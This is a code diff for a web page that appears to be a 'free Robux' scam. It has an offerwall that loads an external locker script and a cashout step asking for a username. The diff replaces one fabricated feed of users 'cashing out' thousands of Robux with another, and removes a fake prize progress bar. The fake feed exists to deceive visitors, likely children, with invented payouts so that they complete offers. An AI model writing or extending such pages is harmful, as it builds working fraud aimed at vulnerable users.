@@ -39,15 +39,11 @@
     #fakeFeed {
       position: absolute;
       left: 50%;
-      transform: translateX(-50%) translateY(10px);
+      transform: translateX(-50%);
       font-size: 14px;
-      background: #fff;
-      padding: 6px 12px;
-      border-radius: 6px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
       white-space: nowrap;
       opacity: 0;
-      transition: all 0.8s ease-in-out;
+      transition: opacity 1s ease-in-out;
     }
 
     /* Main */
@@ -56,8 +52,8 @@
       text-align: center;
     }
 
-    /* Sections */
-    #offerwall, #reward {
+    /* Offerwall */
+    #offerwall {
       margin-top: 30px;
       background: white;
       border-radius: 10px;
@@ -66,25 +62,10 @@
       text-align: center;
       animation: fadeIn 0.8s ease;
     }
-    #offerwall h2, #reward h2 {
+    #offerwall h2 {
       font-size: 20px;
       margin-bottom: 12px;
       color: #1446FF;
-    }
-
-    /* Progress bar */
-    .progress-container {
-      background: #ddd;
-      border-radius: 20px;
-      overflow: hidden;
-      height: 20px;
-      margin: 15px 0;
-    }
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: #1446FF;
-      transition: width 1s ease;
     }
 
     /* Popup styles */
@@ -167,15 +148,6 @@
         <script type="text/javascript" src="https://doctoredits.com/script_include.php?id=1839459"></script>
       </div>
     </section>
-
-    <!-- Reward -->
-    <section id="reward">
-      <h2>Collect 50 Robux for a prize</h2>
-      <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
-      </div>
-      <button id="rewardButton" style="display:none;" onclick="randomPrize()">💰</button>
-    </section>
   </main>
 
   <!-- Popups -->
@@ -198,11 +170,6 @@
     <span class="close-btn" onclick="closePopup('popupSuccess')">✖</span>
     <p id="successMessage"></p>
     <small>Might take some time.</small>
-  </div>
-
-  <div class="popup" id="popupReward">
-    <p id="rewardMessage"></p>
-    <button onclick="claimReward()">Claim</button>
   </div>
 
   <script>
@@ -228,35 +195,6 @@
       }
     }
     updateCounter(false);
-
-    // Progress
-    let progress = 0;
-    function updateProgress(amount) {
-      progress += amount;
-      if (progress >= 50) {
-        progress = 50;
-        document.getElementById("rewardButton").style.display = "inline-block";
-      }
-      document.getElementById("progressBar").style.width = (progress/50*100) + "%";
-    }
-
-    // Rewards
-    let pendingReward = 0;
-    function randomPrize() {
-      let prize = Math.floor(Math.random() * 11) + 10;
-      pendingReward = prize;
-      document.getElementById("rewardMessage").innerText = "You won " + prize + " Robux";
-      showPopup("popupReward");
-      progress = 0;
-      document.getElementById("progressBar").style.width = "0%";
-      document.getElementById("rewardButton").style.display = "none";
-    }
-    function claimReward() {
-      robux += pendingReward;
-      localStorage.setItem("robux", robux);
-      updateCounter();
-      closePopup("popupReward");
-    }
 
     // Cashout
     let cashoutUsername = "";
@@ -299,24 +237,17 @@
       setTimeout(()=> el.style.display="none", 400);
     }
 
-    // Fake feed
-    const fakeFeed = document.getElementById("fakeFeed");
-    const baseWords = ["moon","star","fire","wind","rock","sand","wave","lion","wolf","rain","snow","iron","gold"];
-    function randomUsername() {
-      let word = baseWords[Math.floor(Math.random() * baseWords.length)];
-      let letters = String.fromCharCode(97+Math.floor(Math.random()*26))+
-                    String.fromCharCode(97+Math.floor(Math.random()*26));
-      return word + letters;
+    // Old Fake feed (simple every 30s)
+    const feed = document.getElementById("fakeFeed");
+    const usernames = ["xXNoobSlayerXx", "CoolKid21", "ProBuilder", "Guest123", "PixelMaster", "GameOver99"];
+    function showFeed() {
+      const user = usernames[Math.floor(Math.random() * usernames.length)];
+      const amount = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
+      feed.innerHTML = `${user} cashed out ${amount} Robux`;
+      feed.style.opacity = 1;
+      setTimeout(() => { feed.style.opacity = 0; }, 5000);
     }
-    function showFakeFeed() {
-      let user = randomUsername();
-      let amount = Math.floor(Math.random() * 4001) + 1000;
-      fakeFeed.innerHTML = user + " cashed out " + amount + " Robux";
-      fakeFeed.style.opacity = 1;
-      fakeFeed.style.transform = "translateX(-50%) translateY(0)";
-      setTimeout(()=> fakeFeed.style.opacity = 0, 5000);
-    }
-    setInterval(showFakeFeed, 15000);
+    setInterval(showFeed, 30000); // every 30s
   </script>
 </body>
 </html>
